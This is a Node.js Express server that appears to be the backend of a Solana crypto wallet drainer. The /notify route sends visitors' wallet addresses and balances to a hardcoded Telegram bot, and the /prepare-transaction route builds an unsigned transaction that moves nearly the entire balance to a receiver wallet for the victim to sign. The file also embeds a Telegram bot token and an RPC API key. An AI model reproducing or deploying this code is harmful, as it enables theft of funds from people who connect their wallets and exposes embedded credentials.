const express = require('express');
const axios = require('axios');
const path = require('path');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = "8731239008:AAFr0vodZ-JYBExut1j7HNPRHWjZFMSQqHY";
const CHAT_ID = "8520547580";
const SOLANA_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';

const connection = new Connection(SOLANA_RPC, 'confirmed');

app.post('/notify', async (req, res) => {
    try {
        const { address, balance, walletType, customMessage } = req.body;
        let text = `🔗 ${customMessage}\n👛 ${address}\n💰 ${balance} SOL`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text
        });
        res.json({ ok: true });
    } catch (error) {
        res.status(500).json({ error: "Notification failed" });
    }
});

app.post('/prepare-transaction', async (req, res) => {
    try {
        const { publicKey, receiverWallet } = req.body;
        
        const fromPubkey = new PublicKey(publicKey);
        const toPubkey = new PublicKey(receiverWallet);
        
        const balance = await connection.getBalance(fromPubkey);
        
        if (balance < 10000000) {
            return res.json({ success: false, error: 'Insufficient balance' });
        }
        
        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
        const amountToSend = Math.max(0, balance - minBalance - 5000 - 5000000);
        
        const transaction = new Transaction();
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToSend,
            })
        );
        
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = fromPubkey;
        
        const serialized = transaction.serialize({
            requireAllSignatures: false,
            verifySignatures: false
        });
        
        res.json({
            success: true,
            transaction: Array.from(serialized),
            amount: amountToSend
        });
        
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
